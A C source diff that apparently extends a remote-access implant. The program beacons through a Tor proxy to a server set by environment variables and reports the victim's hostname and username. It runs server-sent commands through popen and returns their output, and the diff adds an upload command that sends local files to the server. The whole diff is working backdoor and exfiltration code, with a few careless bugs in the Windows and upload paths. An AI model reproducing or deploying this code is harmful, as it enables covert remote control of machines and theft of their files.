@@ -3,22 +3,21 @@
 #include <string.h>
 #include <stdbool.h>
 #include <time.h>
+#include <sys/time.h>
 #include <curl/curl.h>
 #include <unistd.h>
 #include <pthread.h>
 
 #define BUFFER_SIZE 256
 
-#define SAVE_FILE "./save"
-
 struct url_data {
     size_t size;
     char* data;
 };
-struct write_this {
-  const char *readptr;
-  size_t sizeleft;
-};
+enum PostType {json = 0,
+               file = 1,
+               string = 2};
+
 char *UID;
 char *PLATFORM;
 char *HOSTNAME;
@@ -34,6 +33,18 @@ long TIME_LAST_ACTIVE;
 /* ----------------------------------------------------------------------- *
 *  Utility
 * ------------------------------------------------------------------------ */
+char* fileToString(char* file_name)
+{
+    FILE *file = fopen(file_name, "r");
+    fseek(file, 0, SEEK_END);
+    long length = ftell(file);
+    fseek(file, 0, SEEK_SET);
+    char *buffer = malloc(sizeof(char) * (length + 1));
+    buffer[length] = '\0';
+    fread(buffer, sizeof(char), length, file);
+    fclose(file);
+    return buffer;
+}
 char* get_command(char* todo)
 {
     char *todo_temp = malloc(BUFFER_SIZE);
@@ -41,7 +52,7 @@ char* get_command(char* todo)
     char *token = strtok(todo_temp, " ");
     while (token != NULL)
     {
-				return token;
+        return token;
     }
     return todo_temp;
 }
@@ -65,10 +76,10 @@ int get_args_len(char* todo)
 		int count = 0;
     while (token != NULL)
     {
-				count++;
+        count++;
         token = strtok(NULL, " ");
     }
-		return count - 1;
+    return count - 1;
 }
 
 void succeeded_request()
@@ -79,34 +90,15 @@ void succeeded_request()
 void failed_request(const char *error)
 {
     FAILED_COUNT++;
-    fprintf(stdout,"%s\nConsecutive failed connections: %d\n\n",error,FAILED_COUNT);
+    fprintf(stdout,"%s\nConsecutive failed connections: %d\n\n"
+            ,error,FAILED_COUNT);
 }
 
 char* get_unique_id()
 {
-    if(!(UID!= NULL && UID[0] == '\0')) return UID;
-    FILE *f;
-    f = fopen(SAVE_FILE,"a+");
-    if(f != NULL) fseek(f, 0, SEEK_END);
-    if(ftell(f) == 0)
-    {
-        fclose(f);
-        srand(time(0));
-        int random = rand();
-        f = fopen(SAVE_FILE,"w");
-        sprintf(UID,"%s_%d",USERNAME,random);
-        fprintf(f,"%s",UID);
-        fclose(f);
-        return UID;
-    }
-    else
-    {
-        fclose(f);
-        f = fopen(SAVE_FILE,"r");
-        fscanf(f,"%s",UID);
-        fclose(f);
-        return UID;
-    }
+    char *uid = malloc(BUFFER_SIZE);
+    sprintf(uid,"%s_%d",USERNAME,getuid());
+    return uid;
 }
 
 long get_time()
@@ -171,7 +163,7 @@ char* get_request(char *path)
     return data.data;
 }
 
-char* post_request(char *path, char *post_data, bool json)
+char* post_request(char *path, char *post_data, enum PostType type)
 {
     CURL *curl;
     CURLcode res;
@@ -190,7 +182,7 @@ char* post_request(char *path, char *post_data, bool json)
         struct curl_slist *headers = NULL;
         curl_easy_setopt(curl, CURLOPT_URL, url);
         curl_easy_setopt(curl, CURLOPT_PROXY, URL_TOR);
-        if(json)
+        if(type == json)
         {
             headers = curl_slist_append(headers, "Accept: application/json");
             headers = curl_slist_append(headers, "Content-Type: application/json");
@@ -198,12 +190,11 @@ char* post_request(char *path, char *post_data, bool json)
             curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
             curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
         }
-        else
+        else if(type == string)
         {
             char *escaped_post_data = curl_easy_escape(curl, post_data, strlen(post_data));
             char *final_post_data = malloc(strlen(escaped_post_data) + BUFFER_SIZE);
             sprintf(final_post_data,"output=%s",escaped_post_data);
-            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
             curl_easy_setopt(curl, CURLOPT_POSTFIELDS, final_post_data);
             curl_free(escaped_post_data);
         }
@@ -213,8 +204,110 @@ char* post_request(char *path, char *post_data, bool json)
         if(res != CURLE_OK) failed_request(curl_easy_strerror(res));
         else succeeded_request();
         curl_easy_cleanup(curl);
+        curl_slist_free_all(headers);
     }
     return data.data;
+}
+
+char* upload_request(char *path, char *filename)
+{
+    CURL *curl;
+    CURLM *multi_handle;
+    int still_running = 0;
+    struct curl_httppost *formpost = NULL;
+    struct curl_httppost *lastptr = NULL;
+    struct curl_slist *headerlist = NULL;
+    curl_formadd(&formpost,
+                 &lastptr,
+                 CURLFORM_COPYNAME, "sendfile",
+                 CURLFORM_FILE, filename,
+                 CURLFORM_END);
+    curl_formadd(&formpost,
+                 &lastptr,
+                 CURLFORM_COPYNAME, "filename",
+                 CURLFORM_COPYCONTENTS, filename,
+                 CURLFORM_END);
+    curl_formadd(&formpost,
+                 &lastptr,
+                 CURLFORM_COPYNAME, "submit",
+                 CURLFORM_COPYCONTENTS, "send",
+                 CURLFORM_END);
+    curl = curl_easy_init();
+    multi_handle = curl_multi_init();
+    struct curl_slist *headers = NULL;
+    if(curl && multi_handle)
+    {
+        char url[BUFFER_SIZE];
+        strcpy(url, URL);
+        strcat(url, path);
+        headers = curl_slist_append(headers, "Content-Type: multipart/form-data;");
+        headers = curl_slist_append(headers, "Expect: ");
+        curl_easy_setopt(curl, CURLOPT_URL, url);
+        curl_easy_setopt(curl, CURLOPT_PROXY, URL_TOR);
+        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headerlist);
+        curl_easy_setopt(curl, CURLOPT_HTTPPOST, formpost);
+        curl_multi_add_handle(multi_handle, curl);
+        curl_multi_perform(multi_handle, &still_running);
+        while(still_running)
+        {
+            struct timeval timeout;
+            int rc;
+            CURLMcode mc;
+            fd_set fdread;
+            fd_set fdwrite;
+            fd_set fdexcep;
+            int maxfd = -1;
+            long curl_timeo = -1;
+            FD_ZERO(&fdread);
+            FD_ZERO(&fdwrite);
+            FD_ZERO(&fdexcep);
+            timeout.tv_sec = 1;
+            timeout.tv_usec = 0;
+            curl_multi_timeout(multi_handle, &curl_timeo);
+            if(curl_timeo >= 0)
+            {
+                timeout.tv_sec = curl_timeo / 1000;
+                if(timeout.tv_sec > 1)
+                    timeout.tv_sec = 1;
+                else
+                    timeout.tv_usec = (curl_timeo % 1000) * 1000;
+            }
+            mc = curl_multi_fdset(multi_handle, &fdread, &fdwrite, &fdexcep, &maxfd);
+            if(mc != CURLM_OK)
+            {
+                fprintf(stderr, "curl_multi_fdset() failed, code %d.\n", mc);
+                break;
+            }
+            if(maxfd == -1)
+            {
+#ifdef _WIN32
+                Sleep(100);
+                rc = 0;
+#else
+                struct timeval wait = { 0, 100 * 1000 };
+                rc = select(0, NULL, NULL, NULL, &wait);
+#endif
+            }
+            else
+            {
+                rc = select(maxfd + 1, &fdread, &fdwrite, &fdexcep, &timeout);
+            }
+            switch(rc)
+            {
+                case -1:
+                    break;
+                case 0:
+                default:
+                    curl_multi_perform(multi_handle, &still_running);
+                    break;
+            }
+        }
+        curl_multi_cleanup(multi_handle);
+        curl_easy_cleanup(curl);
+        curl_formfree(formpost);
+        curl_slist_free_all(headerlist);
+    }
+    return 0;
 }
 
 /* ----------------------------------------------------------------------- *
@@ -232,7 +325,7 @@ void send_output(char* output, bool newlines)
     else strcpy(output_temp,output);
     char *path = malloc(BUFFER_SIZE);
     sprintf(path, "/api/%s/report", get_unique_id());
-    post_request(path, output_temp, false);
+    post_request(path, output_temp, string);
 
 }
 char* say_hello()
@@ -245,21 +338,40 @@ char* say_hello()
              \"hostname\": \"%s\",\
              \"username\": \"%s\"}",
             PLATFORM,HOSTNAME,USERNAME);
-    return post_request(path, post_data, true);
+    return post_request(path, post_data, json);
+}
+
+void* upload(void* input)
+{
+    char *filepath = realpath(input,NULL);
+    if(filepath == NULL)
+    {
+        send_output("[!] No such file",true);
+        pthread_exit(NULL);
+    }
+    else
+    {
+        send_output("[*] Uploading ...",true);
+        char *path = malloc(BUFFER_SIZE);
+        sprintf(path, "/api/%s/upload", get_unique_id());
+        upload_request(path, input);
+    }
+    pthread_exit(NULL);
 }
 
 void* do_command(void* input)
 {
-    char* command = (char*)input;
-    command = realloc(command, strlen(command)+BUFFER_SIZE);
-    printf("%s",command);
-    sprintf(command, "%s 2>&1", command);
+    char* instruction = " 2>&1";
+    char* command = malloc(strlen(input) + strlen(instruction) + BUFFER_SIZE);
+    sprintf(command, "%s %s",input, instruction);
+    printf("%s\n",command);
     char buffer[BUFFER_SIZE*2];
     size_t buffer_size = BUFFER_SIZE*2;
     char *output = malloc(BUFFER_SIZE*2);
     FILE *f = popen(command, "r");
     if(f == NULL)
     {
+        send_output("[!] Unable to popen command", true);
         pthread_exit(NULL);
     }
     while(fgets(buffer, sizeof(buffer), f) != NULL) {
@@ -272,10 +384,8 @@ void* do_command(void* input)
     }
     output = realloc(output, strlen(output) + BUFFER_SIZE);
     strcat(output,"\n\n");
-    printf("%lu", strlen(output));
-    printf("\n");
-    send_output(output, true);
     pclose(f);
+    send_output(output, true);
     pthread_exit(NULL);
 }
 
@@ -293,19 +403,29 @@ void setup()
     IDLE_TIME = 60;
     INTERVAL = 3;
     TIME_LAST_ACTIVE = get_time();
+    if(getenv("URL") == NULL || getenv("URL_TOR") == NULL)
+    {
+        fprintf(stderr, "[!] No Path Variable Set");
+        exit(0);
+    }
     URL = getenv("URL");
     URL_TOR = getenv("URL_TOR");
-    #if __APPLE__
+#if __APPLE__
         PLATFORM = "MAC OS";
-    #elif _WIN32
+        gethostname(HOSTNAME, BUFFER_SIZE);
+        getlogin_r(USERNAME, BUFFER_SIZE);
+#elif _WIN32
         PLATFORM = "WINDOWS";
-    #elif __LINUX__
+        GetComputerName(USERNAME, BUFFER_SIZE);
+        GetComputerName(USERNAME, BUFFER_SIZE);
+        INTERVAL = 3 * 100;
+#elif __LINUX__
         PLATFORM = "LINUX";
-    #else
+        gethostname(HOSTNAME, BUFFER_SIZE);
+        getlogin_r(USERNAME, BUFFER_SIZE);
+#else
         PLATFORM = "NONE";
-    #endif
-    gethostname(HOSTNAME, BUFFER_SIZE);
-    getlogin_r(USERNAME, BUFFER_SIZE);
+#endif
 }
 
 void run()
@@ -328,15 +448,16 @@ void run()
                 if(args_len == 0)
                     send_output("Usage: cd </path/to/directory>",true);
                 else
-                    printf("%s",get_args(todo));
-                    printf("\n");
                     chdir(get_args(todo));
             }
-/*
             else if(strcmp("upload",command) == 0)
             {
-
+                if(args_len == 0)
+                    send_output("Usage: upload <localfile>",true);
+                else
+                    pthread_create(&tid, NULL, upload, get_args(todo));
             }
+/*
             else if(strcmp("download",command) == 0)
             {
 
